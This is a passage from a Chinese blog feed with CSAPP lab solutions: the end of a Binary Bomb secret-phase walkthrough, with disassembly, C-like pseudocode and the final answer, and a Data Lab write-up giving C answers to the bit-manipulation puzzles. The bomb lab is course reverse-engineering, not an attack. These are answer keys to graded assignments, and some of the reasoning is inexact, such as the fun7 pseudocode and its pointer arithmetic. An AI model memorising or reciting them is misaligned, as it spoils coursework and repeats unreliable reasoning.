id="secret-phase">secret_phase</h3><p>一切还没结束，从汇编代码看，我们还剩一个隐藏炸弹没有拆解掉。首先，我们需要找到隐藏炸弹的输入入口。否则，gdb 调试器是帮不了我们的。全局搜索一下，发现在 <code>phase_defused</code> 函数下找到了 <code>call secret_phase</code> 语句。</p><p>经分析，确认是要在拆解完所有炸弹后，才有机会见到这枚隐藏炸弹。而如何输入密语也是非常考验我们的水平的！因此，先要细细研究 <code>phase_defused</code> 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nasm">phase_defused:<br>;  ...<br>jne    80496fe &lt;phase_defused+0x7e&gt;<br>mov    $0x804a990,%eax ; 0x804a990 ???<br>mov    %eax,%edx<br>lea    -0x54(%ebp),%eax; arg : (%ebp-0x54)<br>mov    %eax,0xc(%esp)<br>lea    -0x58(%ebp),%eax; arg : (%ebp-0x58)<br>mov    %eax,0x8(%esp)<br>movl   $0x8049e38,0x4(%esp) ; 0x8049e38 ??<br> <br>mov    %edx,(%esp)<br>call   8048868 &lt;sscanf@plt&gt; ; sscanf<br>mov    %eax,-0x4(%ebp)<br>cmpl   $0x2,-0x4(%ebp)<br>jne    80496f2 &lt;phase_defused+0x72&gt;<br>movl   $0x8049e3e,0x4(%esp); 0x8049e3e ??<br> <br>lea    -0x54(%ebp),%eax<br>mov    %eax,(%esp)<br>call   804908f &lt;strings_not_equal&gt;<br>test   %eax,%eax; to see if string is equal<br>jne    80496f2 &lt;phase_defused+0x72&gt;<br>; ...<br></code></pre></td></tr></table></figure><p>重点是 <code>sscanf</code> 函数及其参数，第一个参数是 <code>%edx</code> ，指向 <code>0x804a990</code> ，第二个参数是 <code>0x8049e38</code>，其实是一个字符串（见下图）， 第三个参数和第四个参数分别是 <code>%ebp-0x58</code> 和 <code>%ebp-0x54</code> 。从后半部分代码看出，要求输入的字符串必须是 austinpowers，且 <code>sscanf</code> 函数返回值为 2，意思是整数和字符串必须都有对应的输入。</p><p><img src="/img/CSAPP/lab2/secret.png" alt=""></p><p><img src="/img/CSAPP/lab2/s_1.png" alt=""></p><p>再来看看 <code>0x804a990</code> （见下图），很奇怪的是，它只有一个 “9”，这样的话，<code>sscanf</code> 函数的返回值就只能是 1 了，我们就没法打开隐藏关卡了。还有，这个 <code>&lt;input_string&gt;</code> 是什么？</p><p><img src="/img/CSAPP/lab2/s_2.png" alt=""></p><p>看起来，要先解决 <code>&lt;input_string&gt;</code> 的问题，不过，一切来的很轻松（见下图）。看来，我们之前拆炸弹的每一个输入都以 80 字节对齐的方式存放于此！这样看来，就是要在第 4 个炸弹拆解时，后面加上字符串 austinpowers， 就可以发现隐藏炸弹了！</p><p><img src="/img/CSAPP/lab2/s_3.png" alt=""></p><p>终于，我们来到了隐藏炸弹，现在看看这一炸弹的具体代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nasm">secret_phase:<br>push   %ebp<br>mov    %esp,%ebp<br>sub    $0x18,%esp<br>call    &lt;read_line&gt;<br>mov    %eax,-0xc(%ebp)<br>mov    -0xc(%ebp),%eax<br>mov    %eax,(%esp)<br>call    &lt;atoi@plt&gt;<br></code></pre></td></tr></table></figure><p>看起来，需要读入一行，并且读入的这一行会使用 <code>atoi</code> 函数转为数字。要求数字必须为正数，且小于 <code>0x3e9</code> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nasm">mov    %eax,-0x8(%ebp)<br>cmpl   $0x0,-0x8(%ebp)<br>jle     &lt;secret_phase+0x2b&gt; ; %eax &lt;= 0 explode<br>cmpl   $0x3e9,-0x8(%ebp)<br>jle    &lt;secret_phase+0x30&gt; ; %eax &lt;= 0x3e9 <br>call   8049656 &lt;explode_bomb&gt;<br>mov    -0x8(%ebp),%eax<br>mov    %eax,0x4(%esp); (%esp+0x4)=int<br>movl   $0x804a720,(%esp) ; 0x804a720 ???<br>call   8048eaa &lt;fun7&gt;<br>mov    %eax,-0x4(%ebp) ; return val=eax<br>cmpl   $0x3,-0x4(%ebp); %eax==0x3, or explode <br>je      &lt;secret_phase+0x51&gt;<br>call    &lt;explode_bomb&gt;<br>movl   $0x804999c,(%esp)<br>call   80487c8 &lt;puts@plt&gt;<br>call   8049680 &lt;phase_defused&gt;<br>leave  <br>ret    <br></code></pre></td></tr></table></figure><p>重点是 <code>fun7</code> 函数，其参数有两个，一个是我们输入的数字，另一个是立即数 <code>0x804a720</code>，这个立即数不应当是一个“数字”，更有可能是一个指针。由上面的代码可知，返回值应该为3，否则就会爆炸。接下来，仔细研究一下 <code>fun7</code> 的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nasm">fun7:<br>push   %ebp<br>mov    %esp,%ebp<br>sub    $0xc,%esp<br>cmpl   $0x0,0x8(%ebp); (%ebp+0x8)=0x804a720<br>jne     &lt;fun7+0x15&gt;<br>movl   $0xffffffff,-0x4(%ebp); low 2 word is 0 then (%ebp-0x4)=-1<br>jmp    8048f13 &lt;fun7+0x69&gt;<br>mov    0x8(%ebp),%eax<br>mov    (%eax),%eax<br>cmp    0xc(%ebp),%eax; %eax=((%ebp+0x8)) &lt;= (%ebp+0xc)<br>jle      &lt;fun7+0x3b&gt;<br>mov    0x8(%ebp),%eax<br>mov    0x4(%eax),%edx; %edx = ((%ebp+0x8)+0x4)<br>mov    0xc(%ebp),%eax<br>mov    %eax,0x4(%esp); (%esp+0x4)=(%ebp+0xc)<br>mov    %edx,(%esp)<br>call   8048eaa &lt;fun7&gt;<br>add    %eax,%eax<br>mov    %eax,-0x4(%ebp)<br>jmp    8048f13 &lt;fun7+0x69&gt;<br>mov    0x8(%ebp),%eax; <br>mov    (%eax),%eax<br>cmp    0xc(%ebp),%eax; %eax=((%ebp+0x8)) != (%ebp+0xc)<br>jne    8048ef8 &lt;fun7+0x4e&gt;<br>movl   $0x0,-0x4(%ebp)<br>jmp    8048f13 &lt;fun7+0x69&gt;<br>mov    0x8(%ebp),%eax<br>mov    0x8(%eax),%edx; %edx = ((%ebp+0x8)+0x8)<br>mov    0xc(%ebp),%eax; <br>mov    %eax,0x4(%esp); (%esp+0x4)=(%ebp+0xc)<br>mov    %edx,(%esp)<br>call   8048eaa &lt;fun7&gt; ; call fun7<br>add    %eax,%eax<br>inc    %eax<br>mov    %eax,-0x4(%ebp)<br>mov    -0x4(%ebp),%eax<br>leave  <br>ret    <br></code></pre></td></tr></table></figure><p>转化为 C 代码，可能比较方便理解，可见，还是递归函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fun7</span><span class="hljs-params">(<span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> b)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*a &amp; <span class="hljs-number">0x0ffff</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (*a &lt;= b) &#123;<br>            <span class="hljs-keyword">if</span> (*a != b) &#123;<br>                a+=<span class="hljs-number">8</span> byte;<br>                <span class="hljs-type">int</span> ret = fun7(a, b);<br>                ret += ret;ret++;<br>                <span class="hljs-keyword">return</span> ret;<br>            &#125; <span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a+=<span class="hljs-number">4</span> byte;<br>            <span class="hljs-type">int</span> ret = fun7(a, b);<br>            ret += ret;<br>            <span class="hljs-keyword">return</span> ret;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在，需要让 <code>fun7</code> 函数返回值为3，应当如何设置a 和 b 的值呢？不难想到，返回值为3，要求最内部的函数返回值为0，然后再返回1，再返回3，但首先，需要知道 <code>0x804a720</code>的值。经过多次尝试，求出如下数据：</p><p><img src="/img/CSAPP/lab2/6_4.png" alt=""></p><p>根据之前的推算，需要调用三层 <code>fun7</code> 函数，第一次需走入 <code>*a&lt;b</code> 的分支，第二次也是，第三次需要走入 <code>*a==b</code> 的分支，这样返回的值才能为3。倒推回去，第一次指针为 <code>0x804a720</code> ，第二次需要 +8，指针地址为 <code>0x804a708</code> ，然后再加8，为 <code>0x804a6d8</code> ，此时指针指向的值是 <code>0x6b</code> 。要求输入的值与 <code>0x6b</code> 相等，才能返回3，因此，拆解该炸弹的答案是 107。</p><p>最后的最后，解答成功！</p><p><img src="/img/CSAPP/lab2/final.png" alt=""></p><h2 id="总结">总结</h2><p>回头看这几颗炸弹的拆解过程，每颗炸弹难度递增，考点不一但都极具代表性。第一阶段考察了字符串比较，需要我们熟练使用 gdb 调试器。第二阶段考察了汇编语言的循环部分，能否理解循环非常关键。第三阶段考察了汇编语言的 <code>switch</code> 语句的实现。第四阶段考察了递归函数调用，第五阶段考察了数组索引以及循环结构，第六阶段则是关于链表的遍历。最后的秘密阶段更是融合了多个考点，做完之后很有成就感！</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>x86</tag>
      
      <tag>CSAPP</tag>
      
      <tag>BinaryBombs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解计算机系统之位操作实验</title>
    <link href="/2021/04/30/2021-4-30-CSAPPLab01/"/>
    <url>/2021/04/30/2021-4-30-CSAPPLab01/</url>
    
    <content type="html"><![CDATA[<h1>深入理解计算机系统——位操作实验</h1><h2 id="实验介绍">实验介绍</h2><p>实验资料可从<a href="http://csapp.cs.cmu.edu/3e/labs.html">CSAPP 官网</a>获取。</p><p>本实验考察了位操作符的使用以及整数和单精度浮点数的位级表示。通过完成这 15 个有关位运算的题目，可以加深大家对计算机中数据的理解。注意，所有要实现函数都位于 <code>bits.c</code> 文件。</p><ul><li><p><code>bits.c</code> 唯一需要修改的源代码文件</p></li><li><p><code>btest.c</code>  该文件用于评估位操作实现功能的正确性，每次实现一个函数后，建议使用 <code>btest</code> 来检查功能是否正确：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>./btest<br></code></pre></td></tr></table></figure><p>也可以使用 <code>-f</code> 标志检查单个函数的正确性，例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./btest -f bitXor</span><br></code></pre></td></tr></table></figure></li><li><p>dlc 语法检查，检查是否使用了违反规定的操作。如果程序没有输出，说明我们的程序没有问题。</p></li></ul><h2 id="位运算实现">位运算实现</h2><h3 id="bitXor">bitXor</h3><p>题目要求：使用 <code>~</code> 和 <code>&amp;</code> 实现 <code>x ^ y</code>。</p><p>关于这个函数的实现，我首先想到了在数字电路课程中学到的技巧：和式转乘积。设两个输入分别为 A 和 B，那么其亦或操作可表示为：$ A \bar{B}+\bar{A}B = \overline{\overline{A\bar{B}} \cdot \overline{\bar{A}B}}$。如此转换，等式中仅存在 <code>~</code> 和 <code>&amp;</code> 运算。于是，代码可写为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~(~(x &amp; ~y) &amp; ~(~x &amp; y));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tmin">tmin</h3><p>题目要求：返回二进制补码下的最小整数。</p><p>这题非常简单，只要略知补码的表示方式就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isTmax">isTmax</h3><p>题目要求：判断 <code>x</code> 是否是二进制补码下的最大数，若是返回 1。仅能使用 <code>!</code> <code>~</code> <code>&amp;</code> <code>^</code> <code>|</code> <code>+</code> 。</p><p>首先明确，二进制补码下最大数是 <code>0x7fff ffff</code>。其次明确，<strong>可以通过加法等方式，在特点条件下获得结果 0 ，然后取反</strong>，来完成对相应数字的判断。我最先想到的是，通过判断 <code>x</code> 加上其反码再加一是否为 0 来决定，后来发现不对，所有数都满足这一条件 :sweat_smile:。</p><p>仍采取加法策略 <code>0x7fff ffff+1=0x8000 0000</code>，然后再累加，得到 0 ，但这样还不够，因为 -1 也满足要求。注意到，<code>0xffff ffff +1 = 0x0</code> ，于是 <code>!!(x+1)</code> 可以判断是否为 -1，于是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> ((!(x+<span class="hljs-number">1</span>+x+<span class="hljs-number">1</span>))&amp;(!!(x+<span class="hljs-number">1</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="allOddBits">allOddBits</h3><p>题目要求：判断 <code>x</code> 中的奇数位置是否全为 1，若是返回 1。比如 <code>0xAAAA AAAA</code> 就满足要求。</p><p>与上题同样的思路：<strong>找出某运算过程，使得符号要求的数字经计算后得到 0，从而判断命题真伪，我取名为得 0 思想</strong> 。判断 <code>x</code> 的某位是否为 1 ，有两种做法：一是 <code>x</code> 与 1 取 <code>&amp;</code> ，即 <code>&amp;</code> 的保持性，二是 <code>x</code> 与 0 取 <code>|</code> ，即 <code>|</code> 的保持性。该使用哪一种？第二种。因为第一种要求立即数奇数位为 1 才能有区分性，但偶数位得出的结果是不定的，因此使用第一种后，计算得出的结果会难以判断问题的真伪。</p><p>而第二种中，要求立即数奇数位为 0 才能有区分性，若立即数偶数位全为 1 ，那么 <code>|</code> 运算后，偶数位一定都是 1 ，这是确定的。</p><p><img src="/img/CSAPP/lab1/1.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> a = <span class="hljs-number">0x55</span>;<br>  <span class="hljs-type">int</span> b = a + (a&lt;&lt;<span class="hljs-number">8</span>) + (a&lt;&lt;<span class="hljs-number">16</span>) + (a&lt;&lt;<span class="hljs-number">24</span>);<br>  <span class="hljs-keyword">return</span> !~(b|x);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="negate">negate</h3><p>题目要求：返回 -<code>x</code> 的值。</p><p>这题非常简单，二进制补码中，求相反数只需取反再加一就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isAsciiDigit">isAsciiDigit</h3><p>题目要求：判断输入的 <code>x</code> 是否是数字的 ASCII 码。</p><p>收到前面几题的影响，我一开始仍从<strong>得 0 思想</strong>入手。但感觉 <code>0x30</code> 到 <code>0x39</code> 的二进制共同特征不太明显，故放弃。再从上一题的求 -<code>x</code> 出发，只要判断 <code>x &gt;= '0' &amp;&amp; x &lt;= '9'</code> 即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> (!((x+~<span class="hljs-number">48</span>+<span class="hljs-number">1</span>)&gt;&gt;<span class="hljs-number">31</span>))&amp;(!!((x+~<span class="hljs-number">58</span>+<span class="hljs-number">1</span>)&gt;&gt;<span class="hljs-number">31</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="conditional">conditional</h3><p>题目要求：实现三运算符：<code>x ? y : z</code> 。</p><p>关键在于，如何选定 <code>y</code> 和 <code>z</code> 。使用 <code>&amp;</code> 的保持性，答案就非常简单：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">([0] &amp; y)</span> | <span class="hljs-comment">([1] &amp; z)</span><br></code></pre></td></tr></table></figure><p>当 [0] 处为 -1，[1] 为 0 ，整个运算值就是 <code>y</code> ，反之为 <code>z</code> ！当然，使用 <code>|</code> 的保持性也是可行的。在不使用 <code>if</code> 的情况下，可以使用 <code>!x</code> 判断 <code>x!=0</code>。总结一下，<code>x!=0</code> 时，[0] 为 -1，<code>x==0</code> 时，[1] 为 0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>  <span class="hljs-keyword">return</span> ((!x+~<span class="hljs-number">1</span>+<span class="hljs-number">1</span>)&amp;y)|((~!x+<span class="hljs-number">1</span>)&amp;z);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isLessOrEqual">isLessOrEqual</h3><p>题目要求：判断 <code>x&lt;=y</code> 是否成立，若成立返回 1，否则返回 0。</p><p>判断大小，使用减法。在只能使用 <code>+</code> 的情况下，需转换为<code>x-y = x+ ~y+1</code> 。注意到，<code>x-y</code> 判断比 <code>y-x</code> 更复杂（还要验证 0 的情况），因此使用 <code>y-x</code> 。再考虑溢出的情况：当 <code>y</code> 为正数，<code>x</code> 为负数，<code>y-x</code> 却为负数，便发生了溢出，应当返回 1 ，却返回了 0 。当 <code>y</code> 为负数，<code>x</code> 为正数，<code>y-x</code> 却为正数，应当返回 0 ，却返回了 1 。</p><p>后来发现，问题可以进一步简化，先取出符号位，当 <code>y</code> 为正数，<code>x</code> 为负数时直接为真。然后再相减，更加方便。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-type">int</span> sx = (x&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x01</span>;<br>  <span class="hljs-type">int</span> sy = (y&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x01</span>;<br>  <span class="hljs-type">int</span> diff = ((y+~x+<span class="hljs-number">1</span>)&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x01</span>;<br>  <span class="hljs-type">int</span> c1 = sx &amp; (~sy);<br>  <span class="hljs-type">int</span> c2 = (~sx) &amp; sy;<br>  <span class="hljs-keyword">return</span> c1 | (!c2 &amp; !diff);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="logicNeg">logicNeg</h3><p>题目要求：实现 <code>!</code> 运算</p><p>问题可改为，如何判断一个数全为 0 。注意到，<code>-x</code> 相当于按位取反再加一，如果 <code>x</code> 为 非 0 数，那么 <code>x|(-x)</code> 后必定为 -1 。利用这个性质，即可判断是否为 0 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> ((x | (~x +<span class="hljs-number">1</span>)) &gt;&gt; <span class="hljs-number">31</span>) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="howManyBits">howManyBits</h3><p>题目要求：求出 <code>x</code> 最少需要多少 bits 来表示。</p><p>这题就比较难，判断最少需要多少 bits 来表示 <code>x</code> ，实际上就是去掉那些无用的高位 bits。对正数而言，这题等价于求最高位1出现的位置，然后把高位的 0 删到仅剩一个符号位。而对负数而言，这等价于求负数的最高位 0 出现的位置，因此需要预处理。类似于 <code>x ? y : z</code> 的实现，依旧使用 <code>&amp;</code> 的保持性，先搭出框架：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">([0] &amp; (~x)</span>) | <span class="hljs-comment">([1] &amp; x)</span><br></code></pre></td></tr></table></figure><p>然后填写 [0] 和 [1]，算出答案就不难了。</p><p>对于正数而言，<strong>需要找到最左边的 1</strong>。而对于负数，只要按位取反后，便可同样处理。找最左边的 1 ，可以使用二分法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">binSearch</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (left == right)<br>        <span class="hljs-keyword">return</span> left;<br><br>    <span class="hljs-type">int</span> mid = (left + right) &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ([left, mid] 包含<span class="hljs-number">1</span>) <span class="hljs-comment">//最左边1在左半侧</span><br>        <span class="hljs-keyword">return</span> binSearch(left, mid);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> binSearch(mid+<span class="hljs-number">1</span>, right);<br>&#125;<br></code></pre></td></tr></table></figure><p>但实验要求不能使用 <code>if</code> 语句，因此需要手动实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> sign, bit16, bit8, bit4, bit2, bit1, bit0;<br>  sign = x&gt;&gt;<span class="hljs-number">31</span>;<br>  x = (~x &amp; sign) | (~sign &amp; x);<br>  bit16 = !!(x&gt;&gt;<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">4</span>;   <span class="hljs-comment">// 判断高 16 位是否有 1</span><br>  x = x &gt;&gt; bit16;<span class="hljs-comment">// 有 左移16位 没有 不移动 以下同理</span><br>  bit8 = !!(x&gt;&gt;<span class="hljs-number">8</span>) &lt;&lt;<span class="hljs-number">3</span>;<br>  x = x &gt;&gt; bit8;<br>  bit4 = !!(x&gt;&gt;<span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">2</span>;<br>  x = x &gt;&gt; bit4;<br>  bit2 = !!(x&gt;&gt;<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">1</span>;<br>  x = x &gt;&gt; bit2;<br>  bit1 = !!(x&gt;&gt;<span class="hljs-number">1</span>);<br>  x = x &gt;&gt; bit1;<br>  bit0 = x;<br>  <span class="hljs-keyword">return</span> bit16 + bit8 + bit4 + bit2 + bit1 + bit0 + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatScale2">floatScale2</h3><p>题目要求：返回与 <code>f*2</code> 等价的二进制补码下的整数。</p><p>只要熟悉了浮点数的 IEEE 表示方法，这题便不难解决。</p><p>浮点数的表示方法简介如下：</p><p><img src="/img/CSAPP/lab1/2.png" alt=""></p><ul><li><p>denormalized</p><p>exp = 0，E = 1 - Bias = -126，F = 0.frac，将 frac 左移1位。这里有一种特殊情况，如果 frac 最高位为1，最高位左移后，会移动到 exp 中，此时 E = 1 - Bias 仍为 -126，而 F = 1.frac ，因此同样正确。可以说，这个指数设计得相当巧妙！</p></li><li><p>special</p><p>exp = 0xFF，当frac = 0时，代表无穷大，无穷大的2倍同样是无穷大，此时直接返回；当frac != 0时，代表NaN，直接返回。所以当exp = 0xFF时直接返回函数参数。</p></li><li><p>normalized M = exp - Bias, M = 1.frac，将exp+1</p></li></ul><p>于是，不难得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br><span class="hljs-keyword">if</span>(uf == <span class="hljs-number">0</span> || uf == (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>))<br><span class="hljs-keyword">return</span> uf;<br><span class="hljs-keyword">if</span>(((uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">0xff</span>)<br><span class="hljs-keyword">return</span> uf;<br><span class="hljs-keyword">if</span>(((uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">0x00</span>)<br><span class="hljs-keyword">return</span> ((uf &amp; <span class="hljs-number">0x007FFFFF</span>) &lt;&lt; <span class="hljs-number">1</span>) | ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) &amp; uf);<br><span class="hljs-keyword">return</span> uf + (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">23</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 